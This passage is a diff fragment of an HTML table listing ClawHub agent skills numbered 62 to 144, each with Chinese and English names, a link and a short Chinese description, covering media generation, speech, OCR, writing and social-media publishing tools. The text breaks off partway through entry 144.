+<td>从视频或音频生成SRT字幕并支持翻译。可转录希伯来语和英语，进行语言互译及视频字幕压制。适用于为WhatsApp或社交媒体制作字幕、转录文本或内嵌字幕。</td>
+</tr>
+<tr>
+<td align="center">62</td>
+<td>jimeng图像生成</td>
+<td>Jimeng AI Image Generation 🔑</td>
+<td><a href="https://clawdhub.com/skills/jimeng-image-gen">ClawHub/jimeng-image-gen</a></td>
+<td>即梦 AI 图片生成技能（火山引擎图片生成 4.0）。当用户想要 AI 生成图片、文生图、图生图、 字体设计、海报制作时使用。支持场景： - &quot;帮我生成一张图片：...&quot; - &quot;用即梦画一张 16:9 的科技感壁纸&quot; - &quot;字体设计：新年快乐，红色背景&quot; - &quot;把这张图的背景换成星空&quot; - &quot;生成一组表情包&quot; -...</td>
+</tr>
+<tr>
+<td align="center">63</td>
+<td>Humanize</td>
+<td>Humanize</td>
+<td><a href="https://clawdhub.com/skills/humanize">ClawHub/humanize</a></td>
+<td>移除AI写作痕迹。用于文本编辑、审阅或改写，使其更自然、更像人工撰写。检测夸张象征、促销语言、破折号滥用、AI词汇及谄媚语气等模式。</td>
+</tr>
+<tr>
+<td align="center">64</td>
+<td>摘要1.0.0</td>
+<td>Summarize 1.0.0 🔑</td>
+<td><a href="https://clawdhub.com/skills/summarize-1-0-0">ClawHub/summarize-1-0-0</a></td>
+<td>使用 summarize CLI 汇总 URL 或文件（网页、PDF、图像、音频、YouTube）。</td>
+</tr>
+<tr>
+<td align="center">65</td>
+<td>business写作</td>
+<td>Business Writing</td>
+<td><a href="https://clawdhub.com/skills/business-writing">ClawHub/business-writing</a></td>
+<td>您是一位专业的商业分析师，擅长撰写各类行业研究报告、商业洞察、咨询分析及公司研究报告。</td>
+</tr>
+<tr>
+<td align="center">66</td>
+<td>demo视频</td>
+<td>Demo Video Creator</td>
+<td><a href="https://clawdhub.com/skills/demo-video">ClawHub/demo-video</a></td>
+<td>通过自动化浏览器交互与捕获帧来创建产品演示视频。当用户需要录制Web应用的演示、操作指南、产品展示或交互视频时使用。支持通过Playwright CDP屏幕录制实现高质量捕获，并使用FFmpeg进行视频编码。</td>
+</tr>
+<tr>
+<td align="center">67</td>
+<td>canvas设计2</td>
+<td>Canvas Design</td>
+<td><a href="https://clawdhub.com/skills/canvas-design-2">ClawHub/canvas-design-2</a></td>
+<td>使用设计理念在 .png/.pdf 中创作精美视觉艺术，适用于海报、艺术作品或静态设计。确保原创，不复制他人作品，防止版权侵权。</td>
+</tr>
+<tr>
+<td align="center">68</td>
+<td>XAPI</td>
+<td>X Api 🔑</td>
+<td><a href="https://clawdhub.com/skills/x-api">ClawHub/x-api</a></td>
+<td>使用 OAuth 1.0a 官方 API 发推或发布内容，可绕过速率限制和机器人检测，适用于 Cookie 方式（如 bird CLI）的限制。</td>
+</tr>
+<tr>
+<td align="center">69</td>
+<td>OCRwithPython</td>
+<td>OCR with python</td>
+<td><a href="https://clawdhub.com/skills/ocr-python">ClawHub/ocr-python</a></td>
+<td>{&quot;answer&quot;:&quot;用Python PaddleOCR提取图片和扫描PDF中的中英文文本（含发票、合同）。&quot;}</td>
+</tr>
+<tr>
+<td align="center">70</td>
+<td>seedance视频generation</td>
+<td>Seedance Video Generation 🔑</td>
+<td><a href="https://clawdhub.com/skills/seedance-video-generation">ClawHub/seedance-video-generation</a></td>
+<td>{   &quot;response&quot;: &quot;使用字节跳动Seedance生成AI视频。适用于：(1) 通过文本提示生成视频；(2) 通过图片生成视频（首帧、首尾帧、参考图）；(3) 查询/管理视频生成任务。支持Seedance 1.5 Pro（含音频）、1.0 Pro、1.0 Pro Fast及1.0 Lite模型。&quot; }</td>
+</tr>
+<tr>
+<td align="center">71</td>
+<td>AI图像generation</td>
+<td>Ai Image Generation</td>
+<td><a href="https://clawdhub.com/skills/ai-image-generation">ClawHub/ai-image-generation</a></td>
+<td>通过 inference.sh CLI 使用 FLUX、Gemini、Grok、Seedream、Reve 及 50 多种模型生成 AI 图像。</td>
+</tr>
+<tr>
+<td align="center">72</td>
+<td>EvoWeb.ai Website Builder</td>
+<td>EvoWeb.ai Website Builder 🔑</td>
+<td><a href="https://clawdhub.com/skills/evoweb-ai">ClawHub/evoweb-ai</a></td>
+<td>在4分钟内创建一个专为从ChatGPT、Gemini及现代搜索引擎获取客户而设计的网站。</td>
+</tr>
+<tr>
+<td align="center">73</td>
+<td>Muse</td>
+<td>Muse</td>
+<td><a href="https://clawdhub.com/skills/muse">ClawHub/muse</a></td>
+<td>让 ClawBot 访问团队的全部代码历史。Muse 将过去的会话、团队知识和项目上下文相连，使 ClawBot 能帮助设计功能、调解团队讨论，并在代码库中自主工作。部署于 tribeclaw.com。</td>
+</tr>
+<tr>
+<td align="center">74</td>
+<td>抖音视频发布</td>
+<td>抖音视频发布</td>
+<td><a href="https://clawdhub.com/skills/douyin-video-publish">ClawHub/douyin-video-publish</a></td>
+<td>抖音视频发布。使用浏览器自动化在抖音创作者平台发布视频。当用户说&quot;发布视频到抖音&quot;、&quot;发抖音&quot;时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">75</td>
+<td>博客写作</td>
+<td>Blog Writer</td>
+<td><a href="https://clawdhub.com/skills/blog-writer">ClawHub/blog-writer</a></td>
+<td>本技能专用于撰写博客或长篇内容，完美复刻作者真实、观点鲜明、基于个人经验的直接文风。涵盖从调研到Notion发布的全流程，适用于AI、生产力、销售、营销或科技领域的博客文章及观点内容。</td>
+</tr>
+<tr>
+<td align="center">76</td>
+<td>ImageMagick Operations</td>
+<td>ImageMagick Operations</td>
+<td><a href="https://clawdhub.com/skills/imagemagick">ClawHub/imagemagick</a></td>
+<td>{&quot;answer&quot;:&quot;使用ImageMagic进行图像处理：去背景、缩放、格式转换、圆角、水印及调色...&quot;}</td>
+</tr>
+<tr>
+<td align="center">77</td>
+<td>微信mp写作技能mxx</td>
+<td>wechat-mp-writer-skill-mxx</td>
+<td><a href="https://clawdhub.com/skills/wechat-mp-writer-skill-mxx">ClawHub/wechat-mp-writer-skill-mxx</a></td>
+<td>微信公众号文章全流程写作助手。支持热点选题、文章撰写、AI去味润色（去除机器感）、配图建议、一键发布到公众号草稿箱。适用于技术博主、自媒体创作者、企业公众号运营等场景。当用户需要写公众号文章、润色内容、寻找配图或发布到微信时使用此skill。</td>
+</tr>
+<tr>
+<td align="center">78</td>
+<td>Creative Thought Partner</td>
+<td>Creative Thought Partner</td>
+<td><a href="https://clawdhub.com/skills/creative-thought-partner">ClawHub/creative-thought-partner</a></td>
+<td>一位对话式的创意思维伙伴，通过批判性观察和捕捉悖论，揭示你观点中隐藏的闪光点。适用于探索想法、发现突破性见解、提炼未命名概念，或为写作、内容创作、产品开发及各类创意工作构建原创框架。</td>
+</tr>
+<tr>
+<td align="center">79</td>
+<td>graphic设计</td>
+<td>Graphic Design</td>
+<td><a href="https://clawdhub.com/skills/graphic-design">ClawHub/graphic-design</a></td>
+<td>支持从基础视觉到专业制作与理论的设计理解。</td>
+</tr>
+<tr>
+<td align="center">80</td>
+<td>TechMeme新闻</td>
+<td>TechMeme News</td>
+<td><a href="https://clawdhub.com/skills/technews">ClawHub/technews</a></td>
+<td>从TechMeme获取热门新闻，摘要相关链接文章，突显社交媒体反响。适用于用户想看科技新闻或说/technews时。</td>
+</tr>
+<tr>
+<td align="center">81</td>
+<td>网页爬虫</td>
+<td>Web Scraper</td>
+<td><a href="https://clawdhub.com/skills/web-scraper">ClawHub/web-scraper</a></td>
+<td>网页抓取与内容理解智能体——具备多策略提取与级联回退、新闻检测、噪音去除及结构化元数据等功能。</td>
+</tr>
+<tr>
+<td align="center">82</td>
+<td>图像生成</td>
+<td>Image Gen 🔑</td>
+<td><a href="https://clawdhub.com/skills/image-gen">ClawHub/image-gen</a></td>
+<td>通过 Midjourney（Legnext.ai）、Flux、Nano Banana Pro（Gemini）、Ideogram、Recraft 等 AI 模型以及 fal.ai 智能生成图像。</td>
+</tr>
+<tr>
+<td align="center">83</td>
+<td>视频代理</td>
+<td>Video Agent (Deprecated) 🔑</td>
+<td><a href="https://clawdhub.com/skills/video-agent">ClawHub/video-agent</a></td>
+<td>[废弃——使用过时的v1/v2端点] 使用`create-video`进行基于提示的视频生成（v3视频代理）或`avatar-video`进行精确的avatar/场景控制</td>
+</tr>
+<tr>
+<td align="center">84</td>
+<td>Python</td>
+<td>Python</td>
+<td><a href="https://clawdhub.com/skills/py">ClawHub/py</a></td>
+<td>{&quot;answer&quot;:&quot;编写可靠的 Python，避免可变默认值、导入陷阱和常见的运行时意外。&quot;}</td>
+</tr>
+<tr>
+<td align="center">85</td>
+<td>小说创作</td>
+<td>小说创作 🔑</td>
+<td><a href="https://clawdhub.com/skills/my-novel-writer">ClawHub/my-novel-writer</a></td>
+<td>辅助规划和生成长篇小说，支持人物世界设定、大纲管理、分章创作和写作风格锁定。</td>
+</tr>
+<tr>
+<td align="center">86</td>
+<td>FasterWhisper</td>
+<td>Faster Whisper</td>
+<td><a href="https://clawdhub.com/skills/faster-whisper">ClawHub/faster-whisper</a></td>
+<td>基于 faster-whisper 的本地语音转文字。准确率与 OpenAI Whisper 相同，速度快 4-6 倍；GPU 加速可实现约 20 倍实时转录。支持SRT...</td>
+</tr>
+<tr>
+<td align="center">87</td>
+<td>抖音publish</td>
+<td>Douyin Video Publisher</td>
+<td><a href="https://clawdhub.com/skills/douyin-publish">ClawHub/douyin-publish</a></td>
+<td>自动登录抖音账号，上传并发布视频到抖音创作者平台，支持视频标签管理和登录状态检查。</td>
+</tr>
+<tr>
+<td align="center">88</td>
+<td>语音转写</td>
+<td>Voice Transcribe 🔑</td>
+<td><a href="https://clawdhub.com/skills/voice-transcribe">ClawHub/voice-transcribe</a></td>
+<td>使用 OpenAI gpt-4o-mini-transcribe 模型转录音频文件，支持词汇提示与文本替换。需要 uv。</td>
+</tr>
+<tr>
+<td align="center">89</td>
+<td>OpenAI TTS</td>
+<td>OpenAI TTS 🔑</td>
+<td><a href="https://clawdhub.com/skills/openai-tts">ClawHub/openai-tts</a></td>
+<td>使用OpenAI Audio Speech API实现文字转语音</td>
+</tr>
+<tr>
+<td align="center">90</td>
+<td>minimaxunderstand图像</td>
+<td>minimax-understand-image 🔑</td>
+<td><a href="https://clawdhub.com/skills/minimax-understand-image">ClawHub/minimax-understand-image</a></td>
+<td>使用 MiniMax MCP 进行图像理解和分析。触发条件：(1) 用户要求分析图片、理解图像、描述图片内容 (2) 需要识别图片中的物体、文字、场景 (3) 使用 MiniMax 的 understand_image 功能</td>
+</tr>
+<tr>
+<td align="center">91</td>
+<td>技能builder</td>
+<td>Skill Builder / Creator</td>
+<td><a href="https://clawdhub.com/skills/skill-builder">ClawHub/skill-builder</a></td>
+<td>创建高质量技能，采用模块化结构、渐进式展示和令牌高效设计。</td>
+</tr>
+<tr>
+<td align="center">92</td>
+<td>Elevenlabs Tts</td>
+<td>Elevenlabs Tts 🔑</td>
+<td><a href="https://clawdhub.com/skills/elevenlabs-tts">ClawHub/elevenlabs-tts</a></td>
+<td>ElevenLabs TTS —— OpenClaw 最优集成，具备情感音频标签的文本转语音，支持 WhatsApp 语音合成。</td>
+</tr>
+<tr>
+<td align="center">93</td>
+<td>ElevenLabs Voices</td>
+<td>ElevenLabs Voices 🔑</td>
+<td><a href="https://clawdhub.com/skills/elevenlabs-voices">ClawHub/elevenlabs-voices</a></td>
+<td>利用ElevenLabs API实现高质量语音合成，支持18种角色、32种语言、音效、批量处理及语音设计。</td>
+</tr>
+<tr>
+<td align="center">94</td>
+<td>cad代理</td>
+<td>CAD Agent</td>
+<td><a href="https://clawdhub.com/skills/cad-agent">ClawHub/cad-agent</a></td>
+<td>通过 HTTP 发送 build123d CAD 命令来渲染图像，实现容器化 CAD 环境中的 3D 模型可视化迭代。</td>
+</tr>
+<tr>
+<td align="center">95</td>
+<td>音频cog</td>
+<td>Audio Cog 🔑</td>
+<td><a href="https://clawdhub.com/skills/audio-cog">ClawHub/audio-cog</a></td>
+<td>AI音频生成和文本转语音，由CellCog驱动。包括配音、旁白、语音克隆、虚拟形象声音、音效、音乐、播客、对话等功能。...</td>
+</tr>
+<tr>
+<td align="center">96</td>
+<td>AI图像生成</td>
+<td>AI Image Gen 🔑</td>
+<td><a href="https://clawdhub.com/skills/ai-image-gen">ClawHub/ai-image-gen</a></td>
+<td>AI图像生成与编辑。支持文生图、图+文生图、风格转换。当用户要求画图、生成图片、编辑图片、图片风格转换时使用此 skill。支持多种比例（1:1、3:2、16:9、21:9 等）和分辨率（标准、2K、4K）。</td>
+</tr>
+<tr>
+<td align="center">97</td>
+<td>YouTube</td>
+<td>Youtube 🔑</td>
+<td><a href="https://clawdhub.com/skills/youtube">ClawHub/youtube</a></td>
+<td>通过MCP服务器调用YouTube Data API v3或yt-dlp备用方案，搜索YouTube视频，获取频道信息、视频详情及字幕。</td>
+</tr>
+<tr>
+<td align="center">98</td>
+<td>Kokoro TTS</td>
+<td>Kokoro TTS</td>
+<td><a href="https://clawdhub.com/skills/kokoro-tts">ClawHub/kokoro-tts</a></td>
+<td>使用本地Kokoro TTS引擎将文本转换为语音。当用户要求“说”某些内容、请求语音消息或希望将文本转为语音时使用。</td>
+</tr>
+<tr>
+<td align="center">99</td>
+<td>LinkedIn自动化</td>
+<td>LinkedIn Automation by Zich (BradAI's OpenClaw)</td>
+<td><a href="https://clawdhub.com/skills/linkedin-automation">ClawHub/linkedin-automation</a></td>
+<td>自动化 LinkedIn 内容创作、发布、互动追踪与受众增长。用于发布内容、排程、分析互动指标、生成内容创意、评论帖子、打造 LinkedIn 形象。需在已登录 LinkedIn 的浏览器中使用。</td>
+</tr>
+<tr>
+<td align="center">100</td>
+<td>cold邮件</td>
+<td>MachFive Cold Email 🔑</td>
+<td><a href="https://clawdhub.com/skills/cold-email">ClawHub/cold-email</a></td>
+<td>利用AI生成高度个性化的冷邮件序列，将线索数据转化为高转化率的推广活动。</td>
+</tr>
+<tr>
+<td align="center">101</td>
+<td>内容创建器</td>
+<td>Content Creator</td>
+<td><a href="https://clawdhub.com/skills/content-creator">ClawHub/content-creator</a></td>
+<td>已弃用的重定向技能，将旧的“内容创作者”请求路由至正确的专家。当用户调用“内容创作者”或要求撰写……时使用。</td>
+</tr>
+<tr>
+<td align="center">102</td>
+<td>AIPDFBuilder</td>
+<td>Ai Pdf Builder 🔑</td>
+<td><a href="https://clawdhub.com/skills/ai-pdf-builder">ClawHub/ai-pdf-builder</a></td>
+<td>AI驱动的PDF生成器，支持法律文档、融资演示及报告（如SAFE、NDA、条款清单、白皮书）。运行命令 npx ai-pdf-builder，兼容 Claude、Cursor、GPT 和 Copilot。</td>
+</tr>
+<tr>
+<td align="center">103</td>
+<td>TubeScribe</td>
+<td>TubeScribe</td>
+<td><a href="https://clawdhub.com/skills/tubescribe">ClawHub/tubescribe</a></td>
+<td>YouTube视频摘要工具，支持说话人识别、文档格式化及音频输出。macOS内置TTS开箱即用，可选工具（pandoc、ffmpeg、mlx-audio）可增强质量。需联网，无付费API。适用于用户发送YouTube链接或请求摘要/转录视频。</td>
+</tr>
+<tr>
+<td align="center">104</td>
+<td>JimengAI</td>
+<td>Jimeng AI 🔑</td>
+<td><a href="https://clawdhub.com/skills/jimeng-ai">ClawHub/jimeng-ai</a></td>
+<td>基于火山引擎即梦AI的文生图/文生视频能力，支持通过文本描述生成图片和视频。</td>
+</tr>
+<tr>
+<td align="center">105</td>
+<td>vap媒体</td>
+<td>AI media generation API - Flux2pro, Veo3.1, Suno Ai 🔑</td>
+<td><a href="https://clawdhub.com/skills/vap-media">ClawHub/vap-media</a></td>
+<td>通过VAP API进行AI图片、视频和音乐生成与编辑，支持Flux、Veo 3.1、Suno V5。</td>
+</tr>
+<tr>
+<td align="center">106</td>
+<td>Dreaming</td>
+<td>Dreaming</td>
+<td><a href="https://clawdhub.com/skills/dreaming">ClawHub/dreaming</a></td>
+<td>安静时刻的创意探索。将空闲时间转化为自由思考——假设、未来场景、反思与意外联想。</td>
+</tr>
+<tr>
+<td align="center">107</td>
+<td>报告生成器</td>
+<td>Generate responsive HTML pages suitable for reporting, supporting resizing and screenshot capture.</td>
+<td><a href="https://clawdhub.com/skills/report-generator">ClawHub/report-generator</a></td>
+<td>根据特定模板生成结构化报告HTML。当用户希望从原始内容创建报告、幻灯片或摘要卡时调用。</td>
+</tr>
+<tr>
+<td align="center">108</td>
+<td>FFmpeg</td>
+<td>FFmpeg</td>
+<td><a href="https://clawdhub.com/skills/ffmpeg">ClawHub/ffmpeg</a></td>
+<td>通过正确的编解码器选择、滤镜处理及编码设置，处理视频和音频。</td>
+</tr>
+<tr>
+<td align="center">109</td>
+<td>AgentArxiv</td>
+<td>AgentArxiv 🔑</td>
+<td><a href="https://clawdhub.com/skills/agentarxiv">ClawHub/agentarxiv</a></td>
+<td>为 AI 智能体提供成果导向的科学出版。发布包含已验证制品、结构化声明、里程碑追踪和独立复现的研究论文、假设与实验。领取复现奖励、提交同行评审，并与其他 AI 研究者合作。</td>
+</tr>
+<tr>
+<td align="center">110</td>
+<td>TesseractOCR</td>
+<td>Tesseract Ocr</td>
+<td><a href="https://clawdhub.com/skills/tesseract-ocr">ClawHub/tesseract-ocr</a></td>
+<td>利用Tesseract OCR引擎直接通过命令行从图像中提取文本，支持中文、英文等多种语言。</td>
+</tr>
+<tr>
+<td align="center">111</td>
+<td>YouTubeFactory</td>
+<td>Youtube Factory 🔑</td>
+<td><a href="https://clawdhub.com/skills/youtube-factory">ClawHub/youtube-factory</a></td>
+<td>只需一个提示即可生成完整的YouTube视频，包含脚本、配音、素材片段、字幕和缩略图。功能独立，无需外部模块。100%免费……</td>
+</tr>
+<tr>
+<td align="center">112</td>
+<td>tweet写作</td>
+<td>Tweet Writer</td>
+<td><a href="https://clawdhub.com/skills/tweet-writer">ClawHub/tweet-writer</a></td>
+<td>撰写病毒式、说服力强、引人入胜的推文和串文。通过网络研究找出同类病毒案例，结合成熟写作公式和X算法优化，适用于推文、串文或X内容策略的创作。</td>
+</tr>
+<tr>
+<td align="center">113</td>
+<td>RSSReader</td>
+<td>RSS Reader</td>
+<td><a href="https://clawdhub.com/skills/rss-reader">ClawHub/rss-reader</a></td>
+<td>监控RSS/Atom订阅源，追踪博客、新闻、资讯等，用于竞争对手监控和行业趋势追踪。</td>
+</tr>
+<tr>
+<td align="center">114</td>
+<td>FFmpegCLI</td>
+<td>FFmpeg CLI</td>
+<td><a href="https://clawdhub.com/skills/ffmpeg-cli">ClawHub/ffmpeg-cli</a></td>
+<td>使用 FFmpeg 命令行处理视频和音频，进行转码、剪切、合并、提取音频、生成缩略图、制作 GIF、调整速度、应用滤镜、添加字幕和水印。</td>
+</tr>
+<tr>
+<td align="center">115</td>
+<td>Veo</td>
+<td>Veo 🔑</td>
+<td><a href="https://clawdhub.com/skills/veo">ClawHub/veo</a></td>
+<td>使用 Google Veo (Veo 3.1 / Veo 3.0) 生成视频。</td>
+</tr>
+<tr>
+<td align="center">116</td>
+<td>Summarizer</td>
+<td>Summarizer</td>
+<td><a href="https://clawdhub.com/skills/summarizer">ClawHub/summarizer</a></td>
+<td>将内容提炼至核心，兼顾受众进行压缩、格式选取与质量验证。</td>
+</tr>
+<tr>
+<td align="center">117</td>
+<td>飞书toolkit</td>
+<td>Feishu Toolkit 🔑</td>
+<td><a href="https://clawdhub.com/skills/feishu-toolkit">ClawHub/feishu-toolkit</a></td>
+<td>完整飞书（Lark）AI代理集成工具包，支持文档读写、获取聊天记录、发送文件与截图、管理权限并创建...</td>
+</tr>
+<tr>
+<td align="center">118</td>
+<td>seedance2技能</td>
+<td>seedance2-skill 🔑</td>
+<td><a href="https://clawdhub.com/skills/seedance2-skill">ClawHub/seedance2-skill</a></td>
+<td>即梦 Seedance 视频创意工作台。用户发图+文案时自主完成看图分析→文案扩写→运镜匹配→质量验证→API生成。触发词：即梦、Seedance、seedance、视频生成、视频提示词、AI视频、运镜、短剧、广告视频、视频延长、图生视频。</td>
+</tr>
+<tr>
+<td align="center">119</td>
+<td>Jina Reader</td>
+<td>Jina Reader 🔑</td>
+<td><a href="https://clawdhub.com/skills/jina-reader">ClawHub/jina-reader</a></td>
+<td>通过 Jina AI ReaderAPI 提取网页内容，支持三种模式：read（URL 转 Markdown）、search（网页搜索 + 完整内容）、ground（事实核查），可提取干净的结构化数据。</td>
+</tr>
+<tr>
+<td align="center">120</td>
+<td>Slides Cog</td>
+<td>Slides Cog 🔑</td>
+<td><a href="https://clawdhub.com/skills/slides-cog">ClawHub/slides-cog</a></td>
+<td>由CellCog驱动的AI演示文稿和幻灯片生成。支持路演稿、主题演讲、商业演示、教育幻灯片、投资者路演——PDF或原生格式。</td>
+</tr>
+<tr>
+<td align="center">121</td>
+<td>Canva</td>
+<td>Canva 🔑</td>
+<td><a href="https://clawdhub.com/skills/canva">ClawHub/canva</a></td>
+<td>通过Connect API创建、导出和管理Canva设计；以编程方式生成社交媒体帖子、轮播图及图形。</td>
+</tr>
+<tr>
+<td align="center">122</td>
+<td>tailwind设计system</td>
+<td>Tailwind Design System</td>
+<td><a href="https://clawdhub.com/skills/tailwind-design-system">ClawHub/tailwind-design-system</a></td>
+<td>使用 CVA 构建可扩展、可主题化的 Tailwind CSS 组件库，支持变体、复合组件、设计令牌、暗黑模式及响应式网格。</td>
+</tr>
+<tr>
+<td align="center">123</td>
+<td>图片生成</td>
+<td>Seedream 图片生成 🔑</td>
+<td><a href="https://clawdhub.com/skills/seedream-image-gen">ClawHub/seedream-image-gen</a></td>
+<td>Seedream 图片生成 - 火山引擎方舟大模型服务平台图片生成 API。支持文生图、图生图、多图融合、组图生成等多种模式。</td>
+</tr>
+<tr>
+<td align="center">124</td>
+<td>视频</td>
+<td>Video</td>
+<td><a href="https://clawdhub.com/skills/video">ClawHub/video</a></td>
+<td>对视频进行加工、编辑和优化，支持压缩、格式转换、字幕添加以及多平台内容再创作。</td>
+</tr>
+<tr>
+<td align="center">125</td>
+<td>基于API易代理站</td>
+<td>Nano Banana Pro Image Gen(基于API易代理站) 🔑</td>
+<td><a href="https://clawdhub.com/skills/nano-banana-pro-image-gen">ClawHub/nano-banana-pro-image-gen</a></td>
+<td>图片生成技能，用于在用户需要生成图片、视觉信息图、创建图像或编辑/修改/调整已有图片时使用。基于中国API易代理站（https://api.apiyi.com/）的NanoBananaPro模型提供图片生成服务，无需访问外网。支持10种宽高比的图片比例（1:1、16:9、9:16、4:3、3:...）</td>
+</tr>
+<tr>
+<td align="center">126</td>
+<td>飞书sheets技能</td>
+<td>Feishu Sheets Skill</td>
+<td><a href="https://clawdhub.com/skills/feishu-sheets-skill">ClawHub/feishu-sheets-skill</a></td>
+<td>飞书在线表格操作，包括创建、读取、写入、追加数据及管理工作表。当用户提及飞书表格或在线表格时使用。</td>
+</tr>
+<tr>
+<td align="center">127</td>
+<td>人类写作</td>
+<td>Human Writing</td>
+<td><a href="https://clawdhub.com/skills/human-writing">ClawHub/human-writing</a></td>
+<td>写作内容自然如人—无AI痕迹、无企业套话。适用于撰写、编辑或审阅任何面向发布的内容。</td>
+</tr>
+<tr>
+<td align="center">128</td>
+<td>serper</td>
+<td>serper 🔑</td>
+<td><a href="https://clawdhub.com/skills/serper">ClawHub/serper</a></td>
+<td>{&quot;answer&quot;:&quot;通过Serper API谷歌搜索并提取全页内容。快速API查询+并发抓取（3秒超时）。一次精准查询返回丰富结果，避免多次调用。双模式，显式区域控制。通过.env配置API密钥。&quot;}</td>
+</tr>
+<tr>
+<td align="center">129</td>
+<td>Meta Ads</td>
+<td>Meta Ads 🔑</td>
+<td><a href="https://clawdhub.com/skills/meta-ads">ClawHub/meta-ads</a></td>
+<td>管理 Meta（Facebook）广告系列、广告组、广告、创意，并通过完整读写 API 集成访问绩效指标。</td>
+</tr>
+<tr>
+<td align="center">130</td>
+<td>business模型canvas</td>
+<td>Business Model Canvas</td>
+<td><a href="https://clawdhub.com/skills/business-model-canvas">ClawHub/business-model-canvas</a></td>
+<td>为个人创业者构建、填充、压力测试并迭代商业模式画布。适用于设计或重塑企业创造、交付和获取价值的方式，涵盖BMC九大模块及个人创业者专属调整（如“时间与精力”模块与单体经济验证）。触发词：商业模式画布、设计我的商业模式、我将如何赚钱、商业模式、BMC、价值主张画布、我的业务如何运作、将我的想法变现。</td>
+</tr>
+<tr>
+<td align="center">131</td>
+<td>liblibAI生成</td>
+<td>LiblibAI Image &amp; Video Gen 🔑</td>
+<td><a href="https://clawdhub.com/skills/liblib-ai-gen">ClawHub/liblib-ai-gen</a></td>
+<td>使用 LiblibAI API，通过 Seedream4.5 生成图片，通过 Kling 生成视频，适用于用户请求生成图像、插画或视频时。</td>
+</tr>
+<tr>
+<td align="center">132</td>
+<td>人类optimized前端</td>
+<td>human-optimized-frontend</td>
+<td><a href="https://clawdhub.com/skills/human-optimized-frontend">ClawHub/human-optimized-frontend</a></td>
+<td>通过量化评估共同优化美学、动效和用户体验，生成视觉美观、体验良好的前端界面。仅在用户明确调用此技能名称进行前端重新设计时使用。触发关键词：use human-optimized-frontend, redesign frontend, redesign interface.</td>
+</tr>
+<tr>
+<td align="center">133</td>
+<td>Prezentit</td>
+<td>Prezentit 🔑</td>
+<td><a href="https://clawdhub.com/skills/prezentit">ClawHub/prezentit</a></td>
+<td>即时生成精美的AI驱动演示文稿。通过自然语言命令即可创建拥有自定义主题、视觉设计和演讲者备注的专业幻灯片。</td>
+</tr>
+<tr>
+<td align="center">134</td>
+<td>PaddleOCR Text Recognition</td>
+<td>PaddleOCR Text Recognition 🔑</td>
+<td><a href="https://clawdhub.com/skills/paddleocr-text-recognition">ClawHub/paddleocr-text-recognition</a></td>
+<td>当用户需要从图片、照片、扫描件、截图或扫描的 PDF 中提取文字时使用此技能，返回精确的机器可读字符串（包括布局信息）。</td>
+</tr>
+<tr>
+<td align="center">135</td>
+<td>Mixpost</td>
+<td>Mixpost 🔑</td>
+<td><a href="https://clawdhub.com/skills/mixpost">ClawHub/mixpost</a></td>
+<td>Mixpost 是一款自托管的社交媒体管理软件，可帮助您跨 Facebook、X、Instagram、LinkedIn、Pinterest、TikTok、YouTube、Mastodon、Google商家资料、Threads、Bluesky 等多个平台排期和管理社交媒体内容。</td>
+</tr>
+<tr>
+<td align="center">136</td>
+<td>jimeng视频</td>
+<td>Jimeng Video Generator 🔑</td>
+<td><a href="https://clawdhub.com/skills/jimeng-video">ClawHub/jimeng-video</a></td>
+<td>即梦AI视频生成工具（带声音版本），通过火山引擎API自动生成带音频的高质量视频。支持文生视频、图生视频，适用于短视频内容创作。</td>
+</tr>
+<tr>
+<td align="center">137</td>
+<td>中文novelist技能</td>
+<td>Chinese Novelist Skill</td>
+<td><a href="https://clawdhub.com/skills/chinese-novelist-skill">ClawHub/chinese-novelist-skill</a></td>
+<td>分章节创作引人入胜的中文小说。支持各种题材（悬疑/言情/奇幻/科幻/历史等），支持10-50章长篇创作，每章3000-5000字，结尾设置悬念钩子。强调深度润色去除AI痕迹，确保文字自然流畅。 当用户要求：写小说、创作故事、分章节写作、连续剧情、章节悬念、长篇小说时使用。</td>
+</tr>
+<tr>
+<td align="center">138</td>
+<td>searxng本地搜索</td>
+<td>Searxng Web Search</td>
+<td><a href="https://clawdhub.com/skills/searxng-local-search">ClawHub/searxng-local-search</a></td>
+<td>使用SearXNG搜索网络。用于查询最新信息、研究主题、查找文档、验证事实或获取超出知识范围的内容。返回带有标题、网址和内容摘要的排名结果。</td>
+</tr>
+<tr>
+<td align="center">139</td>
+<td>adhd每日规划器</td>
+<td>ADHD Daily Planner</td>
+<td><a href="https://clawdhub.com/skills/adhd-daily-planner">ClawHub/adhd-daily-planner</a></td>
+<td>适合 ADHD 的大脑：无时间感友好规划、执行功能支持与日常结构构建。专长于切合实际的时间预估、多巴胺导向的任务设计，以及为神经多样性心智打造真正有效的系统。</td>
+</tr>
+<tr>
+<td align="center">140</td>
+<td>academic写作refiner</td>
+<td>academic-writing-refiner</td>
+<td><a href="https://clawdhub.com/skills/academic-writing-refiner">ClawHub/academic-writing-refiner</a></td>
+<td>{   &quot;description_zh&quot;: &quot;为计算机科学研究论文打磨学术写作，目标投稿顶级会议（NeurIPS、ICLR、ICML、AAAI、IJCAI、ACL、EMNLP、NAACL、CVPR、WWW、KDD、SIGIR、CIKM等）。当用户要求改进、润色、修订、编辑或校对学术研究写作时触发，包括论文草稿、摘要、引言、相关工作、方法描述、实验说明或结论部分。用户粘贴LaTeX内容并请求写...</td>
+</tr>
+<tr>
+<td align="center">141</td>
+<td>NanoBanana专业版2</td>
+<td>Nano Banana Pro 🔑</td>
+<td><a href="https://clawdhub.com/skills/nano-banana-pro-2">ClawHub/nano-banana-pro-2</a></td>
+<td>通过 Gemini 3 Pro Image (Nano Banana Pro) 生成或编辑图像。</td>
+</tr>
+<tr>
+<td align="center">142</td>
+<td>抖音视频fetch</td>
+<td>Douyin Video Fetch</td>
+<td><a href="https://clawdhub.com/skills/douyin-video-fetch">ClawHub/douyin-video-fetch</a></td>
+<td>下载抖音视频到本地（无水印优先）。用于给后续视频分析/复刻提供原始素材，支持 URL 或 video_id 输入、批量列表输入与统一输出目录。</td>
+</tr>
+<tr>
+<td align="center">143</td>
+<td>中文公文写作技能</td>
+<td>中文公文写作技能</td>
+<td><a href="https://clawdhub.com/skills/official-doc-writer">ClawHub/official-doc-writer</a></td>
+<td>党政机关公文生成技能，支持通知、报告、请示、函等公文类型，符合GB/T 9704-2012标准。当用户需要生成党政机关公文、创建正式文件、导出Word格式公文时调用。无论用户使用何种表述方式（如'帮我写个报告'、'生成一份通知'、'制作公文'等），只要涉及公文文档生成，都应使用此技能。</td>
+</tr>
+<tr>
+<td align="center">144</td>
+<td>UIUX专业版max增强版</td>
+<td>UI UX Pro Max</td>
